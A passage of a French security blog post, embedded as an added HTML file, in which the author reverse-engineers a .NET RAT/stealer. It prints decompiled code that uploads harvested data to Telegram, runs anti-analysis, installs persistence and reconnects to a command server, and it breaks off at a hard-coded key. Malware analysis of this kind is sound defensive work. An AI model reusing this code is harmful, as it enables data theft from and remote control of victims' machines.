@@ -1,0 +1,1412 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - Malware Analysis d&#39;une Virus Télégram</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Malware&#32;Analysis&#32;d&#39;une&#32;Virus&#32;Télégram />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Malware&#32;Analysis&#32;d&#39;une&#32;Virus&#32;Télégram />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Malware&#32;Analysis&#32;d&#39;une&#32;Virus&#32;Télégram />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Malware&#32;Analysis&#32;d&#39;une&#32;Virus&#32;Télégram />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Voici comment j&#39;ai reverse un malware RAT" />
+<meta itemprop="description" content="Voici comment j&#39;ai reverse un malware RAT" />
+<meta property="og:description" content="Voici comment j&#39;ai reverse un malware RAT" />
+<meta name="twitter:description" content="Voici comment j&#39;ai reverse un malware RAT" />
+
+
+<base href="//localhost:1313/posts/analyse-telegram-stealer/" />
+<link rel="canonical" href="//localhost:1313/posts/analyse-telegram-stealer/" itemprop="url" />
+<meta name="url" content="//localhost:1313/posts/analyse-telegram-stealer/" />
+<meta name="twitter:url" content="//localhost:1313/posts/analyse-telegram-stealer/" />
+<meta property="og:url" content="//localhost:1313/posts/analyse-telegram-stealer/" />
+
+
+<meta property="og:updated_time" content="2022-01-08T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/analyse-telegram-stealer/">Malware Analysis d&#39;une Virus Télégram</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2022-01-08T12:00:00Z" class="post-date">
+        January 8, 2022
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>5 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-reverse">
+        <a href="//localhost:1313/tags/reverse">reverse</a>
+      </li>
+      
+      <li class="tag-virus">
+        <a href="//localhost:1313/tags/virus">virus</a>
+      </li>
+      
+      <li class="tag-.net">
+        <a href="//localhost:1313/tags/.net">.net</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <hr>
+<h2 id="introduction">Introduction</h2>
+<p>Je suis tombé sur ce .exe et j&rsquo;ai décidé de l&rsquo;analyser.
+Voici le fichier : <a href="./files/Do_Not_Execute">ici</a>
+<em>Attention à ne pas l&rsquo;executer !</em></p>
+<h2 id="commencement">Commencement</h2>
+<p>Comme le dernier analyse de malware , j&rsquo;ai regardé sur Dnspy si le code était obfusqué .
+A notre plus grande surprise il ne l&rsquo;était pas !
+Regardons de quoi est composé notre payload :</p>
+<p><img src="./img/dnspy.png" alt="All text"></p>
+<p>La Première chose qui saute aux yeux et que c&rsquo;est un malware !
+Regardons la Class <code>Client</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>public <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Main</span>()
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			ServicePointManager.Expect100Continue <span style="color:#f92672">=</span> true;
+</span></span><span style="display:flex;"><span>			ServicePointManager.SecurityProtocol <span style="color:#f92672">=</span> SecurityProtocolType.Tls12;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> Convert.<span style="color:#a6e22e">ToInt32</span>(Settings.Delay); i<span style="color:#f92672">++</span>){Thread.<span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">1000</span>);}
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Settings.<span style="color:#a6e22e">InitializeSettings</span>()){Environment.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">0</span>);}
+</span></span><span style="display:flex;"><span>			try
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				telegram.<span style="color:#a6e22e">UploadFile</span>(Program.<span style="color:#a6e22e">Save</span>(), false);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>MutexControl.<span style="color:#a6e22e">CreateMutex</span>()){Environment.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">0</span>);}
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (Convert.<span style="color:#a6e22e">ToBoolean</span>(Settings.Anti)){Anti_Analysis.<span style="color:#a6e22e">RunAntiAnalysis</span>();}
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (Convert.<span style="color:#a6e22e">ToBoolean</span>(Settings.Install)){NormalStartup.<span style="color:#a6e22e">Install</span>();}
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (Convert.<span style="color:#a6e22e">ToBoolean</span>(Settings.BDOS) <span style="color:#f92672">&amp;&amp;</span> Methods.<span style="color:#a6e22e">IsAdmin</span>()){ProcessCritical.<span style="color:#a6e22e">Set</span>();}
+</span></span><span style="display:flex;"><span>				Methods.<span style="color:#a6e22e">PreventSleep</span>();
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			catch{}
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">while</span>(true){
+</span></span><span style="display:flex;"><span>				try
+</span></span><span style="display:flex;"><span>				{
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ClientSocket.IsConnected)
+</span></span><span style="display:flex;"><span>					{
+</span></span><span style="display:flex;"><span>						ClientSocket.<span style="color:#a6e22e">Reconnect</span>();
+</span></span><span style="display:flex;"><span>						ClientSocket.<span style="color:#a6e22e">InitializeClient</span>();
+</span></span><span style="display:flex;"><span>					}
+</span></span><span style="display:flex;"><span>				}catch{}
+</span></span><span style="display:flex;"><span>				Thread.<span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">5000</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span></code></pre></div><p>C&rsquo;est notre Fonction Principal. Elle execute quelques fonctions au lancement du programme avant de boucler a l&rsquo;infinie sur une connection à un socket .</p>
+<p>Analysons : <code>if (!Settings.InitializeSettings()){Environment.Exit(0);}</code> :</p>
+<p>On retrouve :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>public <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">InitializeSettings</span>()
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">bool</span> result;
+</span></span><span style="display:flex;"><span>			try
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				Settings.Key <span style="color:#f92672">=</span> Encoding.UTF8.<span style="color:#a6e22e">GetString</span>(Convert.<span style="color:#a6e22e">FromBase64String</span>(Settings.Key));
+</span></span><span style="display:flex;"><span>				Settings.aes256 <span style="color:#f92672">=</span> new <span style="color:#a6e22e">Aes256</span>(Settings.Key);
+</span></span><span style="display:flex;"><span>				Settings.TelegramToken <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.TelegramToken);
+</span></span><span style="display:flex;"><span>				Settings.TelegramChatID <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.TelegramChatID);
+</span></span><span style="display:flex;"><span>				Settings.Ports <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.Ports);
+</span></span><span style="display:flex;"><span>				Settings.Hosts <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.Hosts);
+</span></span><span style="display:flex;"><span>				Settings.Version <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.Version);
+</span></span><span style="display:flex;"><span>				Settings.Install <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.Install);
+</span></span><span style="display:flex;"><span>				Settings.MTX <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.MTX);
+</span></span><span style="display:flex;"><span>				Settings.Pastebin <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.Pastebin);
+</span></span><span style="display:flex;"><span>				Settings.Anti <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.Anti);
+</span></span><span style="display:flex;"><span>				Settings.BDOS <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.BDOS);
+</span></span><span style="display:flex;"><span>				Settings.Group <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.Group);
+</span></span><span style="display:flex;"><span>				Settings.Hwid <span style="color:#f92672">=</span> HwidGen.<span style="color:#a6e22e">HWID</span>();
+</span></span><span style="display:flex;"><span>				Settings.Serversignature <span style="color:#f92672">=</span> Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.Serversignature);
+</span></span><span style="display:flex;"><span>				Settings.ServerCertificate <span style="color:#f92672">=</span> new <span style="color:#a6e22e">X509Certificate2</span>(Convert.<span style="color:#a6e22e">FromBase64String</span>(Settings.aes256.<span style="color:#a6e22e">Decrypt</span>(Settings.Certificate)));
+</span></span><span style="display:flex;"><span>				result <span style="color:#f92672">=</span> Settings.<span style="color:#a6e22e">VerifyHash</span>();
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			catch
+</span></span><span style="display:flex;"><span>			{
+</span></span><span style="display:flex;"><span>				result <span style="color:#f92672">=</span> false;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>		}
+</span></span></code></pre></div><p>Si on regarde les <em>string</em> présentes dans la class , on remarque qu&rsquo;elles sont chiffrées puis encodées en Base64 .
+Un petit coup d&rsquo;oeil nous apprend que celle ci sont chiffrées en Aes256 .</p>
+<p>Écrivons un programme pour les déchiffrer !</p>
+<p><img src="./img/string.png" alt="All text"></p>
+<p>On copie ces string dans notre Programme .
+On récupère l&rsquo;IV , le salt et la Key en bytes écrites en dur .</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>public <span style="color:#66d9ef">static</span> string masterKey <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Z25yb09udHlvSUsyY3JHWkUxWm5PbHR5M0NoRVJnQmE=&#34;</span>;
